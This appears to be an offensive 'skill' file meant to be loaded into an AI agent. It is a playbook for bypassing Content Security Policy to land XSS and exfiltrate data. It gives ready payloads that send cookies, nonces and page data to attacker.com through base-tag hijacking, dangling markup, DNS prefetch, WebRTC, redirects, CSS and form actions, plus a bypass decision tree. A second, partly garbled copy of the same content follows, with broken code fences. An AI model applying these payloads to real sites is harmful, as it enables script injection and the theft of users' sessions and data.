---
name: csp-bypass-advanced
description: >-
  Advanced Content Security Policy bypass techniques. Use when XSS or data
  exfiltration is blocked by CSP and you need to find policy weaknesses, trusted
  endpoint abuse, nonce leakage, or exfiltration channels that CSP cannot block.
---

# SKILL: CSP Bypass — Advanced Techniques

> **AI LOAD INSTRUCTION**: Covers per-directive bypass techniques, nonce/hash abuse, trusted CDN exploitation, data exfiltration despite CSP, and framework-specific bypasses. Base models often suggest `unsafe-inline` bypass without checking if the CSP actually uses it, or miss the critical `base-uri` and `object-src` gaps.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS vectors to deliver after CSP bypass
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) when CSP blocks scripts but HTML injection exists — exfiltrate without JS
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF can inject CSP header or steal nonce via response splitting
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when both WAF and CSP must be bypassed
- [clickjacking](../clickjacking/SKILL.md) when CSP lacks `frame-ancestors` — clickjacking still possible

---

## 1. CSP DIRECTIVE REFERENCE MATRIX

| Directive                  | Controls                                              | Default Fallback                         |
| -------------------------- | ----------------------------------------------------- | ---------------------------------------- |
| `default-src`              | Fallback for all `-src` directives not explicitly set | None (browser default: allow all)        |
| `script-src`               | JavaScript execution                                  | `default-src`                            |
| `style-src`                | CSS loading                                           | `default-src`                            |
| `img-src`                  | Image loading                                         | `default-src`                            |
| `connect-src`              | XHR, fetch, WebSocket, EventSource                    | `default-src`                            |
| `frame-src`                | iframe/frame sources                                  | `default-src`                            |
| `font-src`                 | Font loading                                          | `default-src`                            |
| `object-src`               | `<object>`, `<embed>`, `<applet>`                     | `default-src`                            |
| `media-src`                | `<audio>`, `<video>`                                  | `default-src`                            |
| `base-uri`                 | `<base>` element                                      | **No fallback** — unrestricted if absent |
| `form-action`              | Form submission targets                               | **No fallback** — unrestricted if absent |
| `frame-ancestors`          | Who can embed this page (replaces X-Frame-Options)    | **No fallback** — unrestricted if absent |
| `report-uri` / `report-to` | Where violation reports are sent                      | N/A                                      |
| `navigate-to`              | Navigation targets (limited browser support)          | **No fallback**                          |

**Critical insight**: `base-uri`, `form-action`, and `frame-ancestors` do NOT fall back to `default-src`. Their absence is always a potential bypass vector.

---

## 2. BYPASS TECHNIQUES BY DIRECTIVE

### 2.1 `script-src 'self'`

The app only allows scripts from its own origin. Bypass vectors:

| Vector                         | Technique                                                                                                             |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
| JSONP endpoints                | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP reflects callback as JS                              |
| Uploaded JS files              | Upload `.js` file (e.g., avatar upload accepts any extension) → `<script src="/uploads/evil.js"></script>`            |
| DOM XSS sinks                  | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS — inject via URL fragment/param           |
| Angular/Vue template injection | If framework is loaded from `'self'`, inject template expressions: `{{constructor.constructor('alert(1)')()}}`        |
| Service Worker                 | Register SW from same origin → intercept and modify responses                                                         |
| Path confusion                 | `<script src="/user-content/;/legit.js">` — server returns user content due to path parsing, but URL matches `'self'` |

### 2.2 `script-src` with CDN Whitelist

```
script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
```

| Whitelisted CDN        | Bypass                                                                                                |
| ---------------------- | ----------------------------------------------------------------------------------------------------- |
| `cdnjs.cloudflare.com` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection          |
| `cdn.jsdelivr.net`     | jsdelivr serves any npm package or GitHub file: `cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
| `*.googleapis.com`     | Google JSONP endpoints, Google Maps callback parameter                                                |
| `unpkg.com`            | Same as jsdelivr — serves arbitrary npm packages                                                      |
| `*.cloudfront.net`     | CloudFront distributions are shared — any CF customer's JS is allowed                                 |

**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`

### 2.3 `script-src 'unsafe-eval'`

`eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` all permitted.

```javascript
// Template injection → RCE-equivalent in browser
[].constructor.constructor("alert(document.cookie)")();

// JSON.parse doesn't execute code, but if result is used in eval context:
// App does: eval('var x = ' + JSON.parse(userInput))
```

### 2.4 `script-src 'nonce-xxx'`

Only scripts with matching nonce attribute execute.

| Bypass                         | Condition                                                                                                           |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------- |
| Nonce reuse                    | Server uses same nonce across requests or for all users → predictable                                               |
| Nonce injection via CRLF       | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">`                |
| Dangling markup to steal nonce | `<img src="https://attacker.com/steal?` (unclosed) → page content including nonce leaks as URL parameter            |
| DOM clobbering                 | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
| Script gadgets                 | Trusted nonced script uses DOM data to create new script elements — inject that DOM data                            |

### 2.5 `script-src 'strict-dynamic'`

Trust propagation: any script created by an already-trusted script is also trusted, regardless of source.

| Bypass                        | Technique                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `base-uri` injection          | `<base href="https://attacker.com/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `https://attacker.com/lib.js` |
| Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment                                                         |
| DOM XSS in trusted script     | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic`                                                                  |

### 2.6 Angular / Vue CSP Bypass

**Angular (with CSP):**

```html
<!-- Angular template expression bypasses script-src when angular.js is whitelisted -->
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- Angular >= 1.6 sandbox removed, so simpler: -->
{{constructor.constructor('alert(1)')()}}
```

**Vue.js:**

```html
<!-- Vue 2 with runtime compiler -->
<div id="app">{{_c.constructor('alert(1)')()}}</div>
<script src="https://whitelisted-cdn/vue.js"></script>
<script>
  new Vue({ el: "#app" });
</script>
```

### 2.7 Missing `object-src`

If `object-src` is not set (falls back to `default-src`), and `default-src` allows some origins:

```html
<!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->
<object
  data="https://attacker.com/evil.swf"
  type="application/x-shockwave-flash"
>
  <param name="AllowScriptAccess" value="always" />
</object>

<!-- PDF plugin abuse -->
<embed src="/user-upload/evil.pdf" type="application/pdf" />
```

### 2.8 Missing `base-uri`

```html
<!-- Inject base tag → all relative URLs resolve to attacker -->
<base href="https://attacker.com/" />

<!-- Existing script: <script src="/js/app.js"> -->
<!-- Now loads: https://attacker.com/js/app.js -->
```

This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.

### 2.9 Missing `frame-ancestors`

CSP without `frame-ancestors` → page can be framed → clickjacking possible.

`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely.

---

## 3. CSP IN META TAG vs. HEADER

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'" />
```

**Meta tag limitations:**

- Cannot set `frame-ancestors` (ignored in meta)
- Cannot set `report-uri` / `report-to`
- Cannot set `sandbox`
- If injected via HTML injection _before_ the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)
- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)

---

## 4. DATA EXFILTRATION DESPITE CSP

When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:

| Channel               | CSP Directive Needed to Block  | Technique                                                             |
| --------------------- | ------------------------------ | --------------------------------------------------------------------- |
| DNS prefetch          | None (CSP cannot block DNS)    | `<link rel="dns-prefetch" href="//data.attacker.com">`                |
| WebRTC                | None (CSP cannot block)        | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})`    |
| `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP                                                   |
| Redirect-based        | `navigate-to` (rarely set)     | `location='https://attacker.com/?'+document.cookie`                   |
| CSS injection         | `style-src`                    | `<style>body{background:url(https://attacker.com/?data)}</style>`     |
| `<a ping>`            | `connect-src`                  | `<a ping="https://attacker.com/collect" href="#">click</a>`           |
| `report-uri` leak     | N/A                            | Trigger CSP violation → report contains blocked-uri with data         |
| Form submission       | `form-action`                  | `<form action="https://attacker.com/"><button>Submit</button></form>` |

**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.

---

## 5. CSP BYPASS DECISION TREE

```
CSP present?
├── Read full policy (response headers + meta tags)
│
├── Check for obvious weaknesses
│   ├── 'unsafe-inline' in script-src? → Standard XSS works
│   ├── 'unsafe-eval' in script-src? → eval/Function/setTimeout bypass
│   ├── * or data: in script-src? → <script src="data:,alert(1)">
│   └── No CSP header at all on some pages? → Find CSP-free page
│
├── Check missing directives
│   ├── No base-uri? → <base href="https://attacker.com/"> → hijack relative scripts
│   ├── No object-src? → Flash/plugin-based bypass (legacy)
│   ├── No form-action? → Exfil via form submission
│   ├── No frame-ancestors? → Clickjacking possible
│   └── No connect-src falling back to lax default-src? → fetch/XHR exfil
│
├── script-src 'self'?
│   ├── Find JSONP endpoints on same origin
│   ├── Find file upload → upload .js file
│   ├── Find DOM XSS in existing same-origin scripts
│   └── Find Angular/Vue loaded from self → template injection
│
├── script-src with CDN whitelist?
│   ├── Check CDN for JSONP endpoints
│   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
│   └── Check *.cloudfront.net → shared distribution namespace
│
├── script-src 'nonce-xxx'?
│   ├── Nonce reused across requests? → Replay
│   ├── CRLF injection available? → Inject nonce
│   ├── Dangling markup to steal nonce
│   └── Script gadget in trusted scripts
│
├── script-src 'strict-dynamic'?
│   ├── base-uri not set? → <base> hijack
│   ├── DOM XSS in trusted script? → Inherit trust
│   └── Script gadget creating dynamic scripts from DOM data
│
└── All script execution blocked?
    ├── Dangling markup injection → exfil without JS (see ../dangling-markup-injection/SKILL.md)
    ├── DNS prefetch exfiltration
    ├── WebRTC exfiltration
    ├── CSS injection for data extraction
    └── Form action exfiltration
```

---

## 6. TRICK NOTES — WHAT AI MODELS MISS

1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.

````markdown
SKILL: CSP Bypass — Advanced Techniques

AI LOAD INSTRUCTION: Master per-directive bypasses, nonce/hash abuse, strict-dynamic exploitation, Trusted Types evasion, framework-specific vectors, and data exfiltration channels that survive strong CSPs. Never default to "unsafe-inline" suggestions without verifying the actual policy. Prioritize missing no-fallback directives (base-uri, object-src, form-action, frame-ancestors) and real-world misconfigurations.

0. RELATED ROUTING

- xss-cross-site-scripting → Primary XSS delivery after CSP bypass
- dangling-markup-injection → Exfiltrate without JS when scripts are fully blocked
- crlf-injection → Inject/modify CSP headers or steal nonces
- waf-bypass-techniques → When WAF + CSP must both be defeated
- clickjacking → When frame-ancestors is missing
- prototype-pollution → Often combined with CSP bypass for gadget chaining

1. CSP DIRECTIVE REFERENCE MATRIX (Critical)

| Directive                 | Controls                           | Fallback         | Notes                  |
| ------------------------- | ---------------------------------- | ---------------- | ---------------------- |
| default-src               | Fallback for unspecified -src      | None (allow all) | Broad but dangerous    |
| script-src                | JS execution                       | default-src      | Core for XSS defense   |
| style-src                 | CSS loading                        | default-src      |
| img-src / media-src       | Images, audio, video               | default-src      |
| connect-src               | Fetch, XHR, WebSocket, etc.        | default-src      | Exfil control          |
| object-src                | <object>, <embed>, <applet>        | default-src      | Often missing          |
| base-uri                  | <base> element                     | **No fallback**  | Critical bypass vector |
| form-action               | Form submission targets            | **No fallback**  | Form hijacking         |
| frame-ancestors           | Framing (replaces X-Frame-Options) | **No fallback**  | Clickjacking           |
| navigate-to               | Navigation targets                 | **No fallback**  | Limited support        |
| require-trusted-types-for | Enforces Trusted Types             | N/A              | Modern hardening       |

**Key Insight:** `base-uri`, `form-action`, `frame-ancestors`, and `navigate-to` have **no fallback** to default-src. Their absence is almost always exploitable.

2. BYPASS TECHNIQUES BY DIRECTIVE

2.1 script-src 'self'

- JSONP endpoints on same origin (`/api/jsonp?callback=alert(1)//`)
- File uploads that accept `.js` (avatars, imports, etc.)
- DOM XSS in existing same-origin scripts
- Framework template injection (Angular/Vue loaded from 'self')
- Path confusion / Relative Path Overwrite (RPO): `/user-content/;/legit.js`

  2.2 script-src with CDN / Host Whitelists
  Common whitelists: `*.googleapis.com *.gstatic.com cdn.jsdelivr.net unpkg.com *.cloudfront.net`

- jsdelivr / unpkg: Load arbitrary npm/GitHub packages
- JSONP on Google domains (`accounts.google.com/o/oauth2/revoke?callback=...`)
- Shared CloudFront distributions
- Search: `site:whitelisted-domain.com inurl:callback`

  2.3 script-src 'unsafe-eval'

```js
[].constructor.constructor("alert(document.cookie)")();
new Function("alert(1)")();
setTimeout("alert(1)", 0);
```
````

2.4 script-src 'nonce-xxx'

- Nonce reuse across requests/users
- CRLF response splitting to inject new CSP/nonce
- Dangling markup + CSS attribute selectors to exfiltrate nonce
- DOM clobbering of nonce-checking logic
- Script gadgets in trusted nonced code that create new scripts from controllable DOM data

  2.5 script-src 'strict-dynamic'
  Trust propagates from nonce/hash-trusted scripts.

- Missing `base-uri`: `<base href="https://attacker.com/">` → hijack relative `<script src="/js/app.js">`
- DOM XSS in trusted script → injected `<script>` inherits trust
- Script gadgets: `document.createElement('script'); s.src = location.hash...` or `s.textContent = ...`

  2.6 Framework-Specific Bypasses
  **Angular** (when angular.js is allowed):

```html
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
{{constructor.constructor('alert(1)')()}}
```

**Vue** (runtime compiler):

```html
<div id="app">{{_c.constructor('alert(1)')()}}</div>
```

2.7 Missing object-src / Legacy Plugins

- SVG with `<script>` (especially with specific Content-Type)
- Old Flash / PDF plugin abuse (less relevant but still appears)

  2.8 Missing base-uri (High Impact)

```html
<base href="https://attacker.com/" />
```

Hijacks all relative script/style/iframe sources. Works against nonce + strict-dynamic.

2.9 Missing frame-ancestors / form-action

- Clickjacking (frame-ancestors)
- Form hijacking for credential exfil (form-action)

3. META TAG vs HEADER CSP

- Meta CSP cannot set `frame-ancestors`, `sandbox`, `report-*`
- First meta tag in DOM order wins in some browsers
- Header + Meta → intersection (most restrictive)

4. DATA EXFILTRATION DESPITE STRONG CSP

- DNS prefetch / WebRTC (CSP cannot fully block)
- CSS `background-url` + attribute selectors
- `<a ping>`, form submissions (if form-action missing)
- Dangling markup
- Report-uri leakage (contains blocked-uri, source-file, etc.)

5. MODERN HARDENINGS & THEIR WEAKNESSES

- `require-trusted-types-for 'script'` + `trusted-types` → Look for DOM sink bypasses, policy name enumeration, or cross-frame abuse
- Multiple CSP headers → Most restrictive wins
- Report-Only mode (`Content-Security-Policy-Report-Only`) → No enforcement

6. CSP BYPASS DECISION TREE

```
Is CSP present? (Check headers + meta)
├── 'unsafe-inline' in script-src? → Classic XSS
├── 'unsafe-eval'? → eval/Function bypass
├── Wildcard / broad host? → JSONP, jsdelivr, etc.
├── Missing base-uri? → <base> hijack
├── Missing object-src / form-action / frame-ancestors? → Plugin / Form / Clickjacking
├── Nonce? → Reuse, leak (CSS/DOM), CRLF, gadgets
├── strict-dynamic? → base-uri, trusted script DOM XSS, gadgets
└── Everything blocked? → Dangling markup + DNS/WebRTC/CSS exfil
```

7. TRICK NOTES — WHAT MOST MODELS MISS
1. `default-src 'self'` does **not** restrict base-uri, form-action, or frame-ancestors.
1. `strict-dynamic` ignores host whitelists and 'self' for dynamically created scripts.
1. Nonce leakage via CSS attribute selectors + cache probing (2025+ technique).
1. SVG + specific Content-Type can bypass script blocks in some apps.
1. Trusted Types can still be bypassed via certain DOM sinks or cross-frame scenarios.
1. Always check for Report-Only mode.
1. Multiple CSP policies = intersection.

1. TESTING RECOMMENDATIONS

- Chrome DevTools → Security tab + Console violations
- `csp-evaluator` (Google)
- Manually craft minimal policies and test bypasses
- Check for nonce predictability and reuse

